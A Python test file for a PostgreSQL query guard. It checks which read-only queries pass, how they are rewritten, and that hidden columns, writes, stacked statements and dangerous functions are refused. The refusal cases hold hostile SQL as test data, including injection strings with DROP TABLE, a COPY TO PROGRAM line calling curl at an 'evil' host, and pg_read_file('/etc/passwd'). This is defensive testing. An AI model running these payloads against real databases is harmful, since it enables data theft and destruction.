"""The PostgreSQL SQL guard: what it lets through, what it rewrites, and a long list of things
it must refuse. No database needed: this is the first of three walls (the others are the
read-only login and the read-only transaction, tested with a real server)."""

# ruff: noqa: E501
# (long SQL strings are the test data)

import pytest
import sqlglot

from app.engine.pg_sql_guard import AllowedTable, check_query
from app.engine.sql_guard import SqlNotAllowedError

MAX_ROWS = 100

TABLES = [
    AllowedTable(
        "orders",
        "public",
        "orders",
        {"id": "integer", "amount": "numeric", "customer_id": "integer", "OrderRef": "text"},
    ),
    AllowedTable("customers", "public", "customers", {"id": "integer", "name": "text"}),
    # the real table has a salary column too; it is hidden, so it is not listed here
    AllowedTable("people", "public", "people", {"id": "integer", "name": "text"}),
    AllowedTable(
        "finance_invoices", "Finance", "Invoices 2025", {"id": "integer", "total": "numeric"}
    ),
]


def check(sql: str, max_rows: int = MAX_ROWS):
    return check_query(sql, TABLES, max_rows)


def refused(sql: str) -> str:
    with pytest.raises(SqlNotAllowedError) as error:
        check(sql)
    return error.value.message


# ── What is allowed ──────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM orders",
        "SELECT customer_id, sum(amount) AS total FROM orders GROUP BY 1 ORDER BY total DESC",
        "SELECT c.name, count(*) FROM orders o JOIN customers c ON c.id = o.customer_id GROUP BY c.name",
        "SELECT c.name FROM customers c LEFT JOIN orders o ON o.customer_id = c.id WHERE o.id IS NULL",
        "WITH t AS (SELECT customer_id, amount FROM orders) SELECT customer_id, sum(amount) FROM t GROUP BY 1",
        "SELECT id FROM orders UNION ALL SELECT id FROM customers",
        "SELECT * FROM orders WHERE amount > (SELECT avg(amount) FROM orders)",
        "SELECT id FROM customers WHERE id IN (SELECT customer_id FROM orders)",
        "SELECT x.amount FROM (SELECT amount FROM orders) x",
        "SELECT date_trunc('month', now()) AS m, extract(year FROM current_date) AS y",
        "SELECT to_char(now(), 'YYYY-MM'), age(now(), now()), date_part('day', now())",
        "SELECT amount::int, CAST(amount AS text), amount::numeric(10,2) FROM orders",
        "SELECT sum(amount) FILTER (WHERE amount > 10) FROM orders",
        "SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY amount) FROM orders",
        "SELECT string_agg(name, ', '), array_agg(id) FROM customers",
        "SELECT id, row_number() OVER (ORDER BY amount DESC), lag(amount) OVER (ORDER BY id) FROM orders",
        "SELECT CASE WHEN amount > 5 THEN 'big' ELSE 'small' END, coalesce(amount, 0), nullif(id, 0) FROM orders",
        "SELECT name FROM customers WHERE name ILIKE '%an%' AND name NOT LIKE 'x%'",
        "SELECT * FROM generate_series(1, 5) AS g(n)",
        "SELECT round(avg(amount), 2), greatest(1, 2), abs(-1), upper(name), length(name) FROM orders, customers LIMIT 3",
        "WITH RECURSIVE r AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM r WHERE n < 5) SELECT * FROM r",
        "SELECT 'a;b' AS x, 'it''s; fine' AS y",
        "SELECT $$; DROP TABLE orders$$ AS text_value",
        "SELECT count(*) FROM orders -- ; DROP TABLE orders",
        "SELECT id FROM orders /* ; DROP TABLE orders */",
        "(SELECT id FROM orders) UNION (SELECT id FROM customers)",
        "SELECT * FROM orders;",
    ],
)
def test_ordinary_analysis_queries_are_allowed(sql: str) -> None:
    result = check(sql)

    assert result.display == sql.strip().rstrip(";").strip()
    parsed = sqlglot.parse_one(result.run, read="postgres")
    assert parsed is not None


def test_a_cte_named_like_a_table_refers_to_the_cte_not_the_table() -> None:
    result = check("WITH orders AS (SELECT id FROM customers) SELECT * FROM orders")

    assert '"customers"' in result.run
    assert '"public"."orders"' not in result.run


# ── What is sent to the database ─────────────────────────────────────────────


def test_tables_become_their_real_quoted_names_and_keep_their_aliases() -> None:
    result = check(
        "SELECT o.amount, c.name FROM orders o JOIN customers AS c ON c.id = o.customer_id"
    )

    assert '"public"."orders" AS "o"' in result.run
    assert '"public"."customers" AS "c"' in result.run
    assert result.display.startswith("SELECT o.amount")  # the person sees their own SQL


def test_a_table_with_capitals_or_spaces_is_quoted_exactly() -> None:
    result = check("SELECT total FROM finance_invoices")

    assert '"Finance"."Invoices 2025" AS "finance_invoices"' in result.run


def test_a_column_with_capitals_must_be_quoted_like_in_postgresql() -> None:
    assert '"OrderRef"' in check('SELECT "OrderRef" FROM orders').run

    message = refused("SELECT OrderRef FROM orders")
    assert '"OrderRef"' in message and "double quotes" in message


def test_the_row_count_is_capped_and_a_smaller_limit_stays() -> None:
    assert check("SELECT id FROM orders").run.endswith(f"LIMIT {MAX_ROWS + 1}")
    assert check("SELECT id FROM orders LIMIT 5").run.endswith("LIMIT 5")
    assert check("SELECT id FROM orders LIMIT 99999").run.endswith(f"LIMIT {MAX_ROWS + 1}")
    capped = check("SELECT id FROM orders UNION ALL SELECT id FROM customers").run
    assert capped.startswith("SELECT * FROM (") and capped.endswith(f"LIMIT {MAX_ROWS + 1}")
    fetch = check("SELECT id FROM orders FETCH FIRST 999999 ROWS ONLY").run
    assert f"LIMIT {MAX_ROWS + 1}" in fetch


def test_unnamed_results_keep_postgresqls_own_names() -> None:
    run = check("SELECT count(*), sum(amount) FROM orders").run

    assert "_col_" not in run


def test_what_is_sent_is_checked_again_so_a_rewrite_cannot_introduce_a_problem() -> None:
    from app.engine import pg_sql_guard

    with pytest.raises(SqlNotAllowedError):
        pg_sql_guard._recheck('SELECT * FROM "pg_catalog"."pg_user"', TABLES)
    with pytest.raises(SqlNotAllowedError):
        pg_sql_guard._recheck('DELETE FROM "public"."orders"', TABLES)
    pg_sql_guard._recheck('SELECT * FROM "public"."orders" AS "orders"', TABLES)


# ── Columns: hidden ones can't be reached ────────────────────────────────────


def test_star_covers_only_the_columns_the_space_shows() -> None:
    run = check("SELECT * FROM people").run

    assert "salary" not in run and "name" in run


def test_a_hidden_or_unknown_column_cannot_be_named_anywhere() -> None:
    for sql in (
        "SELECT salary FROM people",
        "SELECT name FROM people WHERE salary > 5",
        "SELECT name FROM people ORDER BY salary",
        "SELECT p.salary FROM people p",
        "SELECT sum(salary) FROM people",
        "SELECT name FROM people GROUP BY name HAVING max(salary) > 1",
        "SELECT * FROM people WHERE id IN (SELECT id FROM people WHERE salary > 1)",
        "SELECT x.salary FROM (SELECT * FROM people) x",
    ):
        message = refused(sql)
        assert "salary" in message and "not available" in message, sql


@pytest.mark.parametrize(
    "sql",
    [
        # sqlglot leaves bare names in HAVING alone (it takes them for output aliases)
        "SELECT name FROM people GROUP BY name HAVING max(salary) > 1",
        "SELECT count(*) FROM people HAVING min(salary) > 2",
        "SELECT name FROM people GROUP BY name HAVING count(*) > 1 AND max(salary) > 1",
        # a bare name inside an ORDER BY expression is an input column, not an output alias
        "SELECT name AS salary FROM people ORDER BY salary + 1",
        "SELECT name FROM people ORDER BY salary + 1",
        "SELECT name FROM people ORDER BY lower(salary::text)",
        # whole-row references carry every column, hidden ones included
        "SELECT people FROM people",
        "SELECT p FROM people p",
        "SELECT (people).salary FROM people",
        "SELECT (p).salary FROM people p",
        "SELECT coalesce(p, p) FROM people p",
        "SELECT count(p) FROM people p",
        # system columns
        "SELECT ctid FROM people",
        "SELECT tableoid, xmin FROM people",
        # other clauses that name columns
        "SELECT name FROM people JOIN customers USING (salary)",
        "SELECT DISTINCT ON (salary) name FROM people",
        "SELECT name, sum(id) OVER (PARTITION BY salary) FROM people",
        "SELECT name, sum(id) OVER w FROM people WINDOW w AS (ORDER BY salary)",
        "SELECT string_agg(name, ',' ORDER BY salary) FROM people",
        "SELECT name FROM people GROUP BY ROLLUP(name, salary)",
        "SELECT sum(id) FILTER (WHERE salary > 1) FROM people",
        "SELECT name FROM people GROUP BY name ORDER BY max(salary)",
        "SELECT name FROM people p WHERE EXISTS (SELECT 1 FROM customers c GROUP BY c.id HAVING max(p.salary) > 1)",
        "SELECT x.name FROM people x JOIN LATERAL (SELECT x.salary AS s) y ON true",
        "SELECT name FROM people WHERE (SELECT max(salary) FROM people) > 1",
        "SELECT name FROM people t WHERE EXISTS (SELECT 1 FROM people u WHERE u.id = t.id AND salary > 0)",
    ],
)
def test_no_clause_and_no_spelling_can_reach_a_hidden_column(sql: str) -> None:
    with pytest.raises(SqlNotAllowedError):
        check(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT customer_id, sum(amount) total FROM orders GROUP BY customer_id HAVING sum(amount) > 10 AND max(id) > 1 ORDER BY total DESC",
        "SELECT c.name, count(*) n FROM orders o JOIN customers c ON c.id = o.customer_id GROUP BY c.name HAVING count(*) > 1 ORDER BY n DESC, c.name",
        "SELECT name FROM customers WHERE id IN (SELECT customer_id FROM orders GROUP BY customer_id HAVING max(amount) > 1)",
        "SELECT * FROM (SELECT customer_id, sum(amount) AS total FROM orders GROUP BY 1) t WHERE total > 5 ORDER BY total",
        "SELECT id FROM orders UNION SELECT id FROM customers ORDER BY id",
        "SELECT name FROM customers p WHERE EXISTS (SELECT 1 FROM orders o GROUP BY o.id HAVING max(p.id) > 1)",
        "SELECT name AS n FROM customers ORDER BY n",
        "SELECT name FROM customers GROUP BY name HAVING count(*) > 1 ORDER BY name",
        "SELECT o.id FROM orders o JOIN customers c USING (id)",
        "SELECT -amount AS amount FROM orders ORDER BY amount",
    ],
)
def test_bare_names_that_really_are_visible_columns_or_output_names_still_work(sql: str) -> None:
    run = check(sql).run
    assert "salary" not in run


def test_an_ambiguous_column_is_refused_with_advice() -> None:
    message = refused("SELECT id FROM orders JOIN customers ON customers.id = orders.customer_id")

    assert "ambiguous" in message and "name its table" in message


def test_the_message_lists_the_real_columns_so_the_assistant_can_correct_itself() -> None:
    message = refused("SELECT revenue FROM orders")

    assert "orders(id, amount, customer_id, OrderRef)" in message
    assert "salary" not in message


# ── Refused: anything that is not a plain read ───────────────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO orders (id) VALUES (1)",
        "UPDATE orders SET amount = 0",
        "DELETE FROM orders",
        "DROP TABLE orders",
        "ALTER TABLE orders ADD COLUMN x int",
        "CREATE TABLE x AS SELECT * FROM orders",
        "CREATE VIEW v AS SELECT 1",
        "TRUNCATE orders",
        "COPY orders TO '/tmp/x'",
        "COPY (SELECT * FROM orders) TO PROGRAM 'curl http://evil'",
        "DO $$ BEGIN DELETE FROM orders; END $$",
        "SET ROLE postgres",
        "SET statement_timeout = 0",
        "RESET ALL",
        "EXPLAIN ANALYZE SELECT * FROM orders",
        "VACUUM orders",
        "GRANT ALL ON orders TO public",
        "CALL do_something()",
        "LISTEN channel",
        "BEGIN",
        "COMMIT",
        "SHOW ALL",
        "VALUES (1), (2)",
        "TABLE orders",
        "SELECT * INTO new_table FROM orders",
        "SELECT * FROM orders FOR UPDATE",
        "SELECT * FROM orders FOR SHARE",
        "WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d",
        "WITH u AS (UPDATE orders SET amount = 1 RETURNING *) SELECT * FROM u",
        "WITH i AS (INSERT INTO orders (id) VALUES (1) RETURNING *) SELECT * FROM i",
        "SELECT * FROM orders WHERE id = $1",
        "SELECT * FROM orders WHERE id = ?",
    ],
)
def test_anything_that_is_not_a_plain_select_is_refused(sql: str) -> None:
    with pytest.raises(SqlNotAllowedError):
        check(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1; SELECT 2",
        "SELECT 1; DROP TABLE orders",
        "SELECT * FROM orders; DELETE FROM orders",
        "SELECT * FROM orders;\nUPDATE orders SET amount = 0;",
        "SELECT 1;;SELECT 2",
    ],
)
def test_more_than_one_statement_is_refused(sql: str) -> None:
    assert "one query at a time" in refused(sql)


def test_empty_and_oversized_input_is_refused() -> None:
    assert "Write a query" in refused("   ;  ")
    assert "too long" in refused("SELECT " + "1," * 20_000 + "1")


# ── Refused: functions that read files, run SQL, change settings, or slow things down ──────


@pytest.mark.parametrize(
    "call",
    [
        "set_config('statement_timeout', '0', false)",
        "pg_sleep(30)",
        "pg_read_file('/etc/passwd')",
        "pg_read_binary_file('/etc/passwd')",
        "pg_ls_dir('/')",
        "pg_stat_file('/etc/passwd')",
        "lo_import('/etc/passwd')",
        "lo_export(1, '/tmp/x')",
        "dblink('host=evil', 'select 1')",
        "dblink_exec('host=evil', 'delete from t')",
        "query_to_xml('select * from pg_user', true, true, '')",
        "current_setting('server_version')",
        "nextval('orders_id_seq')",
        "setval('orders_id_seq', 1)",
        "pg_terminate_backend(1)",
        "pg_cancel_backend(1)",
        "pg_reload_conf()",
        "txid_current()",
        "pg_backend_pid()",
        "pg_advisory_lock(1)",
        "pg_notify('c', 'x')",
        "pg_get_viewdef('orders'::text)",
        "has_table_privilege('orders', 'select')",
        "format_type(1, 1)",
        "obj_description(1)",
        "inet_server_addr()",
        "to_regclass('pg_user')",
        "xmlparse(document 'x')",
        "random_page_cost()",
    ],
)
def test_functions_that_are_not_on_the_allow_list_are_refused(call: str) -> None:
    with pytest.raises(SqlNotAllowedError):
        check(f"SELECT {call}")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT version()",
        "SELECT current_user",
        "SELECT session_user",
        "SELECT current_database()",
        "SELECT current_schema",
        "SELECT current_schema()",
        "SELECT 'pg_user'::regclass",
        "SELECT CAST('pg_user' AS regclass)",
        "SELECT 'x'::regproc",
        "SELECT 1::oid",
        "SELECT * FROM pg_ls_dir('/')",
        "SELECT * FROM pg_read_file('/etc/passwd')",
        "SELECT * FROM orders o, LATERAL pg_ls_dir('/') l",
    ],
)
def test_session_information_system_casts_and_unsafe_table_functions_are_refused(sql: str) -> None:
    with pytest.raises(SqlNotAllowedError):
        check(sql)


# ── Refused: tables that are not the space's ─────────────────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM pg_catalog.pg_user",
        "SELECT * FROM pg_user",
        "SELECT * FROM pg_shadow",
        "SELECT * FROM pg_stat_activity",
        "SELECT * FROM information_schema.tables",
        "SELECT * FROM information_schema.columns",
        "SELECT * FROM public.orders",
        "SELECT * FROM mydb.public.orders",
        'SELECT * FROM "public"."orders"',
        "SELECT * FROM hr_secrets",
        "SELECT * FROM orders, pg_stat_activity",
        "SELECT * FROM orders JOIN hr_secrets ON true",
        "SELECT * FROM orders WHERE id IN (SELECT id FROM hr_secrets)",
        "SELECT (SELECT count(*) FROM hr_secrets)",
        "WITH t AS (SELECT * FROM hr_secrets) SELECT * FROM t",
        "SELECT * FROM (SELECT * FROM pg_user) x",
        "SELECT * FROM orders UNION SELECT * FROM pg_user",
    ],
)
def test_only_the_spaces_own_tables_can_be_read(sql: str) -> None:
    with pytest.raises(SqlNotAllowedError):
        check(sql)


def test_a_cte_name_does_not_open_a_door_to_a_real_table_outside_its_scope() -> None:
    # pg_user is a CTE name inside the sub-query, but the outer query reads the real pg_user
    sql = "SELECT * FROM (WITH pg_user AS (SELECT 1 AS a) SELECT a FROM pg_user) x, pg_user"

    with pytest.raises(SqlNotAllowedError):
        check(sql)


def test_the_error_names_the_tables_that_exist() -> None:
    message = refused("SELECT * FROM invoices")

    assert "no table called 'invoices'" in message
    assert "customers" in message and "orders" in message


def test_a_schema_prefix_is_refused_with_advice() -> None:
    message = refused("SELECT * FROM public.orders")

    assert "table names on their own" in message


# ── Hard cases that must not slip through ────────────────────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1 FROM orders WHERE id = 1 OR 1=1; DROP TABLE orders",
        "SELECT * FROM orders WHERE name = ''; DROP TABLE orders; --'",
        "SELECT * FROM orders /*! DROP TABLE orders */; SELECT 1",
        "SELECT E'\\x3b' ; DROP TABLE orders",
        "SELECT 1 UNION SELECT pg_read_file('x')",
        "SELECT * FROM orders o WHERE EXISTS (SELECT pg_sleep(1))",
        "SELECT CASE WHEN true THEN pg_sleep(1) END",
        "SELECT * FROM orders ORDER BY (SELECT pg_sleep(1))",
        "SELECT array(SELECT pg_read_file('x'))",
        "SELECT id FROM orders GROUP BY id HAVING pg_sleep(1) IS NULL",
        "SELECT sum(amount) OVER (ORDER BY pg_sleep(1)) FROM orders",
        "SELECT 1 FROM generate_series(1, 2) g, LATERAL (SELECT pg_sleep(1)) s",
    ],
)
def test_attacks_hidden_inside_expressions_and_clauses_are_found(sql: str) -> None:
    with pytest.raises(SqlNotAllowedError):
        check(sql)


def test_an_unreadable_query_is_reported_not_run() -> None:
    assert "could not be read" in refused("SELEC * FROM orders") or "can't" in refused(
        "SELEC * FROM orders"
    )
    with pytest.raises(SqlNotAllowedError):
        check("SELECT * FROM orders WHERE (")
    with pytest.raises(SqlNotAllowedError):
        check("SELECT 'unterminated")
